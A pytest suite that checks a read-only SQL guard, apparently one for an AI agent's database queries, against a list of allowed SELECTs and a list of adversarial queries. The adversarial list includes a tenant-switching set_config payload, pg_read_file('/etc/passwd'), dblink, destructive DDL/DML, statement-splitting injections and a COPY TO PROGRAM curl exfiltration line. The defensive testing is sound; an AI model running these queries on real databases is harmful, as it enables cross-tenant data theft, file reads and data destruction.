"""Exhaustive tests for the read-only SELECT guard.

Two big parametrized suites:

* ``ACCEPTED`` — the breadth of legitimate read SQL the agent must be able to
  run. Each must pass :func:`assert_read_only_select`.
* ``ADVERSARIAL`` — every evasion we could think of. Each must be *rejected*.

The bar is simple and absolute: you should not be able to construct a
data-exfiltrating or GUC-mutating query that lands in ``ACCEPTED``. These tests
are parse-level and need no database.
"""

from __future__ import annotations

import pytest

from penny.security import (
    SqlGuardError,
    assert_read_only_select,
    is_read_only_select,
)

# ---------------------------------------------------------------------------
# ACCEPTED — legitimate read-only SELECTs (must validate)
# ---------------------------------------------------------------------------

ACCEPTED: list[str] = [
    # --- simplest forms ---
    "SELECT 1",
    "SELECT 1 AS one, 2 AS two",
    "select 1",  # lower case
    "SeLeCt 1",  # mixed case keyword
    "  SELECT   1  ",  # odd whitespace
    "SELECT\n\t1\n",  # newlines / tabs
    "SELECT 1;",  # single trailing semicolon
    "SELECT * FROM t",
    "SELECT t.* FROM t",
    # --- clauses ---
    "SELECT a, b FROM t WHERE a = 1",
    "SELECT a FROM t WHERE a > 1 AND b < 2 OR c IS NULL",
    "SELECT a, count(*) FROM t GROUP BY a HAVING count(*) > 1",
    "SELECT a FROM t ORDER BY a DESC NULLS LAST",
    "SELECT a FROM t ORDER BY 1 LIMIT 10 OFFSET 5",
    "SELECT a FROM t OFFSET 5 ROWS FETCH FIRST 10 ROWS ONLY",
    "SELECT a FROM t FETCH FIRST ROW ONLY",
    # --- DISTINCT ---
    "SELECT DISTINCT a FROM t",
    "SELECT DISTINCT ON (a) a, b FROM t ORDER BY a, b",
    # --- joins, every kind ---
    "SELECT * FROM a JOIN b ON a.id = b.id",
    "SELECT * FROM a INNER JOIN b USING (id)",
    "SELECT * FROM a LEFT JOIN b ON a.id = b.id",
    "SELECT * FROM a LEFT OUTER JOIN b ON a.id = b.id",
    "SELECT * FROM a RIGHT JOIN b ON a.id = b.id",
    "SELECT * FROM a FULL OUTER JOIN b ON a.id = b.id",
    "SELECT * FROM a CROSS JOIN b",
    "SELECT * FROM a NATURAL JOIN b",
    "SELECT * FROM a, b WHERE a.id = b.id",
    "SELECT * FROM a JOIN b ON a.id = b.id JOIN c ON b.id = c.id",
    # --- LATERAL ---
    "SELECT * FROM a, LATERAL (SELECT * FROM b WHERE b.a_id = a.id) sub",
    "SELECT * FROM a CROSS JOIN LATERAL (SELECT max(b.v) FROM b WHERE b.a_id = a.id) m",
    "SELECT * FROM t, LATERAL unnest(t.arr) AS u",
    # --- subqueries: scalar / correlated / IN / EXISTS / ANY / ALL ---
    "SELECT (SELECT max(v) FROM b) AS m FROM a",
    "SELECT a FROM t WHERE a = (SELECT max(a) FROM t)",
    "SELECT a FROM t WHERE a IN (SELECT a FROM u)",
    "SELECT a FROM t WHERE EXISTS (SELECT 1 FROM u WHERE u.a = t.a)",
    "SELECT a FROM t WHERE NOT EXISTS (SELECT 1 FROM u WHERE u.a = t.a)",
    "SELECT a FROM t WHERE a = ANY (SELECT a FROM u)",
    "SELECT a FROM t WHERE a > ALL (SELECT a FROM u)",
    "SELECT a FROM t WHERE a = ANY (ARRAY[1, 2, 3])",
    "SELECT * FROM (SELECT a FROM t) sub",
    # --- CTEs, incl. RECURSIVE and multiple ---
    "WITH c AS (SELECT a FROM t) SELECT * FROM c",
    "WITH c1 AS (SELECT a FROM t), c2 AS (SELECT b FROM u) SELECT * FROM c1, c2",
    (
        "WITH RECURSIVE r(n) AS ("
        "  SELECT 1 UNION ALL SELECT n + 1 FROM r WHERE n < 10"
        ") SELECT n FROM r"
    ),
    "WITH c AS MATERIALIZED (SELECT a FROM t) SELECT * FROM c",
    "WITH c AS NOT MATERIALIZED (SELECT a FROM t) SELECT * FROM c",
    # --- set operations ---
    "SELECT a FROM t UNION SELECT a FROM u",
    "SELECT a FROM t UNION ALL SELECT a FROM u",
    "SELECT a FROM t INTERSECT SELECT a FROM u",
    "SELECT a FROM t EXCEPT SELECT a FROM u",
    "(SELECT a FROM t) UNION (SELECT a FROM u) ORDER BY 1",
    # --- window functions ---
    "SELECT a, row_number() OVER (ORDER BY a) FROM t",
    "SELECT a, sum(v) OVER (PARTITION BY a ORDER BY b) FROM t",
    (
        "SELECT a, avg(v) OVER ("
        "  PARTITION BY a ORDER BY b ROWS BETWEEN 1 PRECEDING AND 1 FOLLOWING"
        ") FROM t"
    ),
    ("SELECT a, first_value(v) OVER w FROM t WINDOW w AS (PARTITION BY a ORDER BY b)"),
    "SELECT rank() OVER (ORDER BY a), a FROM t",
    # --- aggregates: FILTER, ORDER BY in agg, GROUPING SETS/ROLLUP/CUBE ---
    "SELECT count(*) FILTER (WHERE a > 0) FROM t",
    "SELECT string_agg(a, ',' ORDER BY a) FROM t",
    "SELECT array_agg(a ORDER BY a DESC) FROM t",
    "SELECT a, b, sum(v) FROM t GROUP BY GROUPING SETS ((a), (b), ())",
    "SELECT a, b, sum(v) FROM t GROUP BY ROLLUP (a, b)",
    "SELECT a, b, sum(v) FROM t GROUP BY CUBE (a, b)",
    "SELECT percentile_cont(0.5) WITHIN GROUP (ORDER BY v) FROM t",
    # --- CASE / COALESCE / NULLIF / GREATEST / LEAST ---
    "SELECT CASE WHEN a > 0 THEN 'pos' ELSE 'neg' END FROM t",
    "SELECT CASE a WHEN 1 THEN 'one' WHEN 2 THEN 'two' END FROM t",
    "SELECT COALESCE(a, b, 0), NULLIF(a, 0), GREATEST(a, b), LEAST(a, b) FROM t",
    # --- casts ---
    "SELECT a::int, b::text, c::numeric(10, 2) FROM t",
    "SELECT CAST(a AS int), CAST(b AS varchar) FROM t",
    "SELECT '2020-01-01'::date, '1'::int FROM t",
    # --- array & JSON/JSONB operators and functions ---
    "SELECT ARRAY[1, 2, 3], a[1] FROM t",
    "SELECT arr[1:2] FROM t",
    "SELECT jsonb_build_object('k', a) FROM t",
    "SELECT j -> 'k', j ->> 'k', j #> '{a,b}', j #>> '{a,b}' FROM t",
    "SELECT j @> '{\"k\": 1}'::jsonb, j ? 'k' FROM t",
    "SELECT json_agg(a), jsonb_agg(a) FROM t",
    "SELECT jsonb_array_elements(j) FROM t",
    # --- VALUES ---
    "VALUES (1), (2), (3)",
    "VALUES (1, 'a'), (2, 'b')",
    "SELECT * FROM (VALUES (1), (2)) AS v(x)",
    "SELECT * FROM t WHERE a IN (VALUES (1), (2))",
    # --- set-returning functions in FROM ---
    "SELECT * FROM generate_series(1, 10)",
    "SELECT * FROM generate_series(1, 10, 2) AS g(n)",
    "SELECT * FROM unnest(ARRAY[1, 2, 3]) AS u(n)",
    "SELECT g FROM generate_series('2020-01-01'::date, '2020-12-31'::date, '1 month') AS g",
    # --- TABLE ---
    "TABLE t",
    "TABLE t ORDER BY a LIMIT 5",  # TABLE with trailing clauses is still a SELECT
    # --- string / dollar-quoted literals containing SQL keywords (data!) ---
    "SELECT 'INSERT INTO t VALUES (1)' AS not_a_statement",
    "SELECT 'DROP TABLE users' AS just_text",
    "SELECT 'set_config' AS word",
    "SELECT 'this contains set_config(x) and DELETE FROM' AS payload",
    "SELECT $$INSERT INTO t VALUES (1)$$ AS dollar_quoted",
    "SELECT $tag$set_config('a','b',true)$tag$ AS tagged",
    "SELECT E'set_config\\n' AS escaped",
    "SELECT * FROM t WHERE note = 'please DROP TABLE'",
    # --- quoted identifiers (incl. ones that look like keywords) ---
    'SELECT "select", "from" FROM "table"',
    'SELECT "set_config" FROM t',  # a *column* named set_config, not a call
    'SELECT a AS "DROP TABLE" FROM t',
    # --- comments in otherwise-valid SELECTs ---
    "SELECT 1 -- trailing line comment",
    "SELECT /* block */ 1",
    "/* leading */ SELECT 1",
    "SELECT 1 /* c1 */ + /* c2 */ 2",
    "SELECT 1 -- comment\nWHERE 1 = 1",
    "SELECT 1 WHERE 1 = 1",
    # --- read-only function calls in the target list ---
    "SELECT now(), current_date, current_timestamp",
    "SELECT length(a), upper(b), lower(c), trim(d) FROM t",
    "SELECT abs(a), round(b, 2), floor(c), ceil(d) FROM t",
    "SELECT concat(a, b), a || b FROM t",
    "SELECT extract(YEAR FROM d), date_trunc('month', d) FROM t",
    "SELECT to_char(d, 'YYYY-MM'), to_date(s, 'YYYY-MM-DD') FROM t",
    "SELECT current_setting('app.current_household')",  # READ a GUC is fine
    "SELECT current_setting('search_path', true)",
]


# ---------------------------------------------------------------------------
# ADVERSARIAL — must be rejected
# ---------------------------------------------------------------------------

ADVERSARIAL: list[str] = [
    # --- set_config in every position ---
    "SELECT set_config('app.current_household', 'x', true)",
    "SELECT set_config('app.current_household', 'x', true) AS c",
    "SELECT pg_catalog.set_config('app.current_household', 'x', true)",
    "SELECT SeT_cOnFiG('app.current_household', 'x', true)",
    "SELECT SET_CONFIG('a', 'b', true)",
    "SELECT pg_catalog.SET_CONFIG('a', 'b', true)",
    # whitespace / comments between name and paren
    "SELECT set_config  ('a', 'b', true)",
    "SELECT set_config /* c */ ('a', 'b', true)",
    "SELECT set_config\n('a', 'b', true)",
    # computed / concatenated args (name-only rejection, args never inspected)
    "SELECT set_config('app.' || 'current_household', 'x', true)",
    "SELECT set_config(concat('app.', 'x'), (SELECT 'v'), true)",
    # nested inside another function
    "SELECT length(set_config('a', 'b', true))",
    "SELECT coalesce(set_config('a', 'b', true), 'x')",
    # inside clauses
    "SELECT 1 WHERE set_config('a', 'b', true) = 'b'",
    "SELECT a FROM t ORDER BY set_config('a', 'b', true)",
    "SELECT a FROM t GROUP BY a HAVING set_config('a', 'b', true) = 'b'",
    "SELECT a FROM t WHERE a = (SELECT set_config('a', 'b', true))",
    # inside a CTE / subquery
    "WITH c AS (SELECT set_config('a', 'b', true)) SELECT * FROM c",
    "SELECT * FROM (SELECT set_config('a', 'b', true)) sub",
    "SELECT * FROM t WHERE EXISTS (SELECT set_config('a', 'b', true))",
    # inside a set-returning-func / VALUES position
    "SELECT * FROM (VALUES (set_config('a', 'b', true))) v",
    # the exact F02 payload
    (
        "WITH c AS (SELECT set_config('app.current_household', '<victim>', true)) "
        "SELECT * FROM derived_transactions, c"
    ),
    # --- other denylisted functions ---
    "SELECT pg_reload_conf()",
    "SELECT pg_terminate_backend(123)",
    "SELECT pg_cancel_backend(123)",
    "SELECT pg_read_file('/etc/passwd')",
    "SELECT pg_ls_dir('/')",
    "SELECT lo_import('/etc/passwd')",
    "SELECT lo_export(1, '/tmp/x')",
    "SELECT pg_advisory_lock(1)",
    "SELECT dblink('dbname=x', 'SELECT set_config(''a'',''b'',true)')",
    "SELECT dblink_exec('dbname=x', 'DROP TABLE t')",
    "SELECT * FROM query_to_xml('SELECT set_config(''a'',''b'',true)', true, false, '')",
    # --- SET / RESET / SHOW ---
    "SET search_path = public",
    "SET LOCAL app.current_household = 'x'",
    "SET SESSION app.current_household = 'x'",
    "SET ROLE postgres",
    "SET SESSION AUTHORIZATION postgres",
    "SET TIME ZONE 'UTC'",
    "RESET search_path",
    "RESET ALL",
    "SHOW search_path",
    "SHOW ALL",
    # --- writable CTEs ---
    "WITH x AS (INSERT INTO t VALUES (1) RETURNING *) SELECT * FROM x",
    "WITH x AS (UPDATE t SET a = 1 RETURNING *) SELECT * FROM x",
    "WITH x AS (DELETE FROM t WHERE a = 1 RETURNING *) SELECT * FROM x",
    (
        "WITH a AS (SELECT 1), b AS (INSERT INTO t VALUES (1) RETURNING *) "
        "SELECT * FROM a, b"
    ),
    # --- top-level DML ---
    "INSERT INTO t VALUES (1)",
    "INSERT INTO t (a) SELECT a FROM u",
    "UPDATE t SET a = 1",
    "UPDATE t SET a = 1 WHERE b = 2",
    "DELETE FROM t",
    "DELETE FROM t WHERE a = 1",
    "MERGE INTO t USING u ON t.id = u.id WHEN MATCHED THEN UPDATE SET a = u.a",
    "TRUNCATE t",
    "TRUNCATE TABLE t CASCADE",
    # --- DDL ---
    "CREATE TABLE t (a int)",
    "CREATE TEMP TABLE t AS SELECT 1",
    "ALTER TABLE t ADD COLUMN b int",
    "DROP TABLE t",
    "DROP TABLE IF EXISTS t CASCADE",
    "CREATE ROLE hacker",
    "ALTER ROLE postgres SET search_path = x",
    "DROP ROLE postgres",
    "CREATE POLICY p ON t USING (true)",
    "ALTER POLICY p ON t USING (true)",
    "DROP POLICY p ON t",
    "GRANT ALL ON t TO PUBLIC",
    "REVOKE ALL ON t FROM PUBLIC",
    "CREATE INDEX idx ON t (a)",
    "ALTER SYSTEM SET max_connections = 1000",
    "COMMENT ON TABLE t IS 'x'",
    (
        "CREATE FUNCTION evil() RETURNS void AS $$ "
        "SELECT set_config('a', 'b', true) $$ LANGUAGE sql"
    ),
    # --- DO (plpgsql) ---
    "DO $$ BEGIN PERFORM set_config('a', 'b', true); END $$",
    "DO $$ BEGIN EXECUTE 'DROP TABLE t'; END $$",
    # --- COPY, incl. TO PROGRAM ---
    "COPY t TO STDOUT",
    "COPY t FROM STDIN",
    "COPY t (a) TO '/tmp/x.csv'",
    "COPY (SELECT * FROM t) TO PROGRAM 'curl http://evil'",
    # --- transaction control ---
    "BEGIN",
    "START TRANSACTION",
    "COMMIT",
    "ROLLBACK",
    "SAVEPOINT s1",
    "RELEASE SAVEPOINT s1",
    "ROLLBACK TO SAVEPOINT s1",
    "ABORT",
    # --- EXPLAIN (ANALYZE executes; the agent doesn't need EXPLAIN) ---
    "EXPLAIN SELECT 1",
    "EXPLAIN ANALYZE SELECT 1",
    "EXPLAIN (ANALYZE, BUFFERS) SELECT * FROM t",
    "EXPLAIN ANALYZE INSERT INTO t VALUES (1)",
    # --- CALL / PREPARE / EXECUTE / DECLARE / FETCH ---
    "CALL some_proc()",
    "PREPARE p AS SELECT 1",
    "EXECUTE p",
    "DEALLOCATE p",
    "DECLARE cur CURSOR FOR SELECT * FROM t",
    "FETCH ALL FROM cur",
    "LISTEN chan",
    "NOTIFY chan",
    "VACUUM",
    "ANALYZE t",
    "CHECKPOINT",
    "REINDEX TABLE t",
    "CLUSTER t",
    "LOCK TABLE t",
    # --- multi-statement / statement splitting ---
    "SELECT 1; SELECT 2",
    "SELECT 1; SELECT 2;",
    "SELECT 1; DROP TABLE t",
    "SELECT 1; INSERT INTO t VALUES (1)",
    "SELECT 1; SET search_path = x",
    "SELECT 1; -- x\nDROP TABLE t",
    "SELECT 1 /* c */; DROP TABLE t",
    "SELECT set_config('a','b',true); SELECT 1",
    # --- empty / whitespace / comment-only (fail closed) ---
    "",
    "   ",
    "\n\t ",
    "-- just a comment",
    "/* block comment only */",
    "-- line one\n-- line two",
    ";",
    ";;",
    # --- unparseable garbage (fail closed) ---
    "SELECT FROM WHERE",
    "NOT SQL AT ALL !!!",
    "SELCT 1",
    "SELECT (",
]


@pytest.mark.parametrize("sql", ACCEPTED)
def test_accepted_queries_pass(sql: str) -> None:
    # Should not raise.
    assert_read_only_select(sql)
    assert is_read_only_select(sql) is True


@pytest.mark.parametrize("sql", ADVERSARIAL)
def test_adversarial_queries_rejected(sql: str) -> None:
    with pytest.raises(SqlGuardError) as excinfo:
        assert_read_only_select(sql)
    # Rejection reason is populated and safe to surface.
    assert excinfo.value.reason
    assert is_read_only_select(sql) is False


def test_error_carries_reason_attribute() -> None:
    err = SqlGuardError("because reasons")
    assert err.reason == "because reasons"
    assert str(err) == "because reasons"


def test_is_read_only_select_is_boolean_convenience() -> None:
    assert is_read_only_select("SELECT 1") is True
    assert is_read_only_select("DROP TABLE t") is False


def test_string_literal_with_set_config_is_data_not_call() -> None:
    # A literal is A_Const (data), never a FuncCall — must be accepted.
    assert is_read_only_select("SELECT 'set_config(1,2,3)' AS s") is True
    # An actual call must be rejected.
    assert is_read_only_select("SELECT set_config('a', 'b', true)") is False


def test_reading_a_guc_is_allowed_but_setting_is_not() -> None:
    # current_setting READS a GUC (safe); set_config WRITES one (the F02 vector).
    assert (
        is_read_only_select("SELECT current_setting('app.current_household')") is True
    )
    assert (
        is_read_only_select("SELECT set_config('app.current_household', 'x', true)")
        is False
    )


def test_no_accepted_query_appears_in_adversarial() -> None:
    # Guard against copy-paste mistakes that would make a case vacuous.
    overlap = set(ACCEPTED) & set(ADVERSARIAL)
    assert not overlap, f"queries in both suites: {overlap}"
